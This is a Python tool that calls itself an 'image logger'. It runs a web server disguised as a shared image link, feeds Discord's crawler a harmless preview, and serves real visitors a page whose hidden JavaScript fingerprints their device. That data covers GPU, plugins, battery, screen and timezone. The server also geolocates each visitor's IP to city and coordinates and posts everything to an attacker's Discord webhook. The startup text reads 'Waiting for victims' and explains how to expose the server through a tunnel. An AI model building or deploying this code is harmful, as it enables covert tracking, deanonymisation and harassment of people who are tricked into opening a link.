# ULTIMATE PROFESSIONAL IMAGE LOGGER
# Logs EVERYTHING about the user
# By Tim$erz | https://github.com/timzz71

from http.server import BaseHTTPRequestHandler, HTTPServer
import requests, base64, httpagentparser, json, traceback, urllib.parse

# ============================================
# CONFIGURATION - EDIT THESE
# ============================================

config = {
    # ⚠️ YOUR DISCORD WEBHOOK URL (REQUIRED)
    "webhook": "",
    
    # The image that will be shown
    "image": "",
    
    # Webhook settings
    "username": "Ultimate Logger",
    "color": 0xFF0000,
}

# ============================================
# DO NOT EDIT BELOW THIS LINE
# ============================================

def get_ip_info(ip):
    """Get comprehensive IP information"""
    try:
        url = f"http://ip-api.com/json/{ip}?fields=66846719"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return data
    except:
        pass
    return None

def get_detailed_device(user_agent):
    """Get detailed device information"""
    ua = user_agent.lower()
    
    # Device type
    if 'mobile' in ua or 'android' in ua or 'iphone' in ua:
        device = '📱 Mobile Phone'
    elif 'tablet' in ua or 'ipad' in ua:
        device = '📱 Tablet'
    else:
        device = '💻 Desktop Computer'
    
    # OS detection
    os_name = "Unknown"
    if 'windows 11' in ua:
        os_name = 'Windows 11'
    elif 'windows 10' in ua:
        os_name = 'Windows 10'
    elif 'windows 8' in ua:
        os_name = 'Windows 8'
    elif 'windows 7' in ua:
        os_name = 'Windows 7'
    elif 'mac os x' in ua or 'macintosh' in ua:
        os_name = 'macOS'
    elif 'linux' in ua:
        os_name = 'Linux'
    elif 'android' in ua:
        os_name = 'Android'
    elif 'iphone' in ua or 'ipad' in ua:
        os_name = 'iOS'
    elif 'chrome os' in ua:
        os_name = 'Chrome OS'
    
    # Browser detection
    browser = "Unknown"
    if 'edg/' in ua:
        browser = 'Microsoft Edge'
    elif 'opr/' in ua or 'opera' in ua:
        browser = 'Opera'
    elif 'brave' in ua:
        browser = 'Brave'
    elif 'firefox' in ua:
        browser = 'Mozilla Firefox'
    elif 'safari' in ua and 'chrome' not in ua:
        browser = 'Apple Safari'
    elif 'chrome' in ua:
        browser = 'Google Chrome'
    
    return device, os_name, browser

def send_to_discord(ip, user_agent, info, js_data):
    """Send all collected data to Discord webhook"""
    if not config["webhook"]:
        print("❌ No webhook URL set!")
        return
    
    device, os_name, browser = get_detailed_device(user_agent)
    
    # Build the ULTIMATE description
    description = "**🎯 ULTIMATE USER LOG**\n\n"
    
    # ===== IP & LOCATION =====
    description += "**🌐 IP & LOCATION:**\n"
    description += f"> **IP:** `{ip}`\n"
    description += f"> **ISP:** `{info.get('isp', 'Unknown') if info else 'Unknown'}`\n"
    description += f"> **ASN:** `{info.get('as', 'Unknown') if info else 'Unknown'}`\n"
    description += f"> **Country:** `{info.get('country', 'Unknown') if info else 'Unknown'}`\n"
    description += f"> **Region:** `{info.get('regionName', 'Unknown') if info else 'Unknown'}`\n"
    description += f"> **City:** `{info.get('city', 'Unknown') if info else 'Unknown'}`\n"
    description += f"> **Postal Code:** `{info.get('zip', 'Unknown') if info else 'Unknown'}`\n"
    description += f"> **Coordinates:** `{info.get('lat', 'N/A') if info else 'N/A'}, {info.get('lon', 'N/A') if info else 'N/A'}`\n"
    description += f"> **Timezone:** `{info.get('timezone', 'Unknown') if info else 'Unknown'}`\n\n"
    
    # ===== NETWORK =====
    description += "**🏢 NETWORK:**\n"
    description += f"> **Mobile:** `{info.get('mobile', 'Unknown') if info else 'Unknown'}`\n"
    description += f"> **VPN/Proxy:** `{info.get('proxy', 'Unknown') if info else 'Unknown'}`\n"
    description += f"> **Hosting:** `{info.get('hosting', 'Unknown') if info else 'Unknown'}`\n\n"
    
    # ===== DEVICE =====
    description += "**💻 DEVICE:**\n"
    description += f"> **Type:** `{device}`\n"
    description += f"> **OS:** `{os_name}`\n"
    description += f"> **Browser:** `{browser}`\n\n"
    
    # ===== JAVASCRIPT DATA (from the user's browser) =====
    if js_data:
        description += "**🖥️ BROWSER DATA:**\n"
        description += f"> **Screen Resolution:** `{js_data.get('screen', 'Unknown')}`\n"
        description += f"> **Window Size:** `{js_data.get('window', 'Unknown')}`\n"
        description += f"> **Color Depth:** `{js_data.get('colorDepth', 'Unknown')}`\n"
        description += f"> **Language:** `{js_data.get('language', 'Unknown')}`\n"
        description += f"> **Time Zone:** `{js_data.get('timezone', 'Unknown')}`\n"
        description += f"> **Cookies Enabled:** `{js_data.get('cookies', 'Unknown')}`\n"
        description += f"> **Do Not Track:** `{js_data.get('doNotTrack', 'Unknown')}`\n"
        description += f"> **Platform:** `{js_data.get('platform', 'Unknown')}`\n"
        description += f"> **Hardware Concurrency:** `{js_data.get('cores', 'Unknown')} cores`\n"
        description += f"> **Device Memory:** `{js_data.get('memory', 'Unknown')} GB`\n"
        description += f"> **Battery:** `{js_data.get('battery', 'Unknown')}`\n\n"
        
        # ===== PLUGINS =====
        if js_data.get('plugins'):
            description += f"**🔌 Browser Plugins:**\n"
            for plugin in js_data.get('plugins', [])[:10]:
                description += f"> `{plugin}`\n"
            if len(js_data.get('plugins', [])) > 10:
                description += f"> *... and {len(js_data.get('plugins', [])) - 10} more*\n"
            description += "\n"
        
        # ===== WEBGL =====
        if js_data.get('webgl'):
            description += f"**🎮 WebGL / GPU:**\n"
            description += f"> **Renderer:** `{js_data.get('webgl', {}).get('renderer', 'Unknown')}`\n"
            description += f"> **Vendor:** `{js_data.get('webgl', {}).get('vendor', 'Unknown')}`\n"
            description += f"> **Version:** `{js_data.get('webgl', {}).get('version', 'Unknown')}`\n"
            description += f"> **Shading Language:** `{js_data.get('webgl', {}).get('shading', 'Unknown')}`\n"
            description += f"> **Extensions:** `{len(js_data.get('webgl', {}).get('extensions', []))} supported`\n\n"
    
    # ===== FULL USER AGENT =====
    description += "**📄 Full User Agent:**\n"
    description += f"```\n{user_agent}\n```"
    
    embed = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "📡 ULTIMATE IMAGE LOGGER",
                "color": config["color"],
                "description": description,
                "footer": {"text": "Ultimate Image Logger v3.0"},
                "timestamp": "2024-01-01T00:00:00Z"
            }
        ]
    }
    
    if config["image"]:
        embed["embeds"][0]["thumbnail"] = {"url": config["image"]}
    
    try:
        response = requests.post(config["webhook"], json=embed, timeout=5)
        if response.status_code == 204:
            print("✅ Webhook sent successfully!")
        else:
            print(f"⚠️ Webhook response: {response.status_code}")
    except Exception as e:
        print(f"❌ Error sending webhook: {e}")

# Loading image for Discord preview
LOADING_IMAGE = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

# HTML page with JavaScript to collect EVERYTHING
HTML_PAGE = '''<!DOCTYPE html>
<html>
<head>
    <meta property="og:image" content="{image_url}">
    <meta property="og:title" content="Image">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image</title>
    <style>
        body { margin: 0; padding: 0; background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        img { max-width: 100%; max-height: 100%; object-fit: contain; }
    </style>
</head>
<body>
    <img src="{image_url}" alt="Image">
    <script>
        // Collect EVERYTHING
        function collectData() {{
            const data = {{}};
            
            // Screen info
            data.screen = window.screen.width + 'x' + window.screen.height;
            data.window = window.innerWidth + 'x' + window.innerHeight;
            data.colorDepth = window.screen.colorDepth + '-bit';
            data.pixelRatio = window.devicePixelRatio;
            
            // Language & timezone
            data.language = navigator.language || navigator.userLanguage;
            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            data.platform = navigator.platform;
            
            // Cookies & Do Not Track
            data.cookies = navigator.cookieEnabled ? 'Enabled' : 'Disabled';
            data.doNotTrack = navigator.doNotTrack || 'Not set';
            
            // Hardware
            data.cores = navigator.hardwareConcurrency || 'Unknown';
            data.memory = navigator.deviceMemory || 'Unknown';
            
            // Plugins
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {{
                plugins.push(navigator.plugins[i].name);
            }}
            data.plugins = plugins;
            
            // WebGL / GPU
            try {{
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {{
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {{
                        data.webgl = {{
                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                            version: gl.getParameter(gl.VERSION),
                            shading: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                            extensions: gl.getSupportedExtensions() || []
                        }};
                    }}
                }}
            }} catch(e) {{}}
            
            // Battery
            try {{
                if (navigator.getBattery) {{
                    navigator.getBattery().then(function(battery) {{
                        data.battery = (battery.level * 100).toFixed(0) + '%';
                        if (!battery.charging) data.battery += ' (Discharging)';
                        else data.battery += ' (Charging)';
                        sendData(data);
                    }});
                    return;
                }}
            }} catch(e) {{}}
            
            sendData(data);
        }}
        
        function sendData(data) {{
            fetch('/collect', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify(data)
            }});
        }}
        
        // Run on load
        window.onload = collectData;
    </script>
</body>
</html>'''

class ImageLoggerHandler(BaseHTTPRequestHandler):
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        try:
            forwarded_for = self.headers.get('x-forwarded-for', '').split(',')[0].strip()
            if not forwarded_for:
                forwarded_for = self.client_address[0]
            
            user_agent = self.headers.get('user-agent', '')
            path = self.path.split("?")[0]
            
            print(f"📥 Request from IP: {forwarded_for}")
            
            if path == '/favicon.ico':
                self.send_response(204)
                self.end_headers()
                return
            
            # Check if Discord crawler
            if 'discord' in user_agent.lower() or forwarded_for.startswith(("34", "35")):
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(LOADING_IMAGE)
                return
            
            # Log IP immediately
            info = get_ip_info(forwarded_for)
            send_to_discord(forwarded_for, user_agent, info, None)
            
            # Serve the HTML page with JavaScript
            image_url = config["image"]
            html = HTML_PAGE.format(image_url=image_url)
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())
            
        except Exception as e:
            print(f"❌ Error: {e}")
            traceback.print_exc()
            self.send_response(500)
            self.end_headers()
    
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            try:
                js_data = json.loads(post_data.decode('utf-8'))
                print(f"📊 Received JavaScript data: {len(str(js_data))} bytes")
                
                # Get IP
                forwarded_for = self.headers.get('x-forwarded-for', '').split(',')[0].strip()
                if not forwarded_for:
                    forwarded_for = self.client_address[0]
                
                user_agent = self.headers.get('user-agent', '')
                info = get_ip_info(forwarded_for)
                
                # Send to Discord with JS data
                send_to_discord(forwarded_for, user_agent, info, js_data)
                
            except:
                pass
            
            self.send_response(200)
            self.end_headers()
            
        except Exception as e:
            print(f"❌ POST Error: {e}")
            self.send_response(500)
            self.end_headers()

def run_server():
    port = 8080
    server = HTTPServer(('', port), ImageLoggerHandler)
    print("=" * 70)
    print("  🖼️ ULTIMATE PROFESSIONAL IMAGE LOGGER")
    print("=" * 70)
    print(f"✅ Server started on http://localhost:{port}")
    print("✅ Logs EVERYTHING about the user")
    print("=" * 70)
    print("\n📨 SHARE THIS LINK ON DISCORD:")
    print(f"   http://localhost:{port}/")
    print("\n🌍 WITH CLOUDFLARE:")
    print("   cloudflared tunnel --url http://localhost:8080")
    print("   Then share: https://your-url.trycloudflare.com/")
    print("=" * 70)
    print("\n⏳ Waiting for victims...")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n🛑 Server stopped.")
        server.server_close()

if __name__ == "__main__":
    run_server()
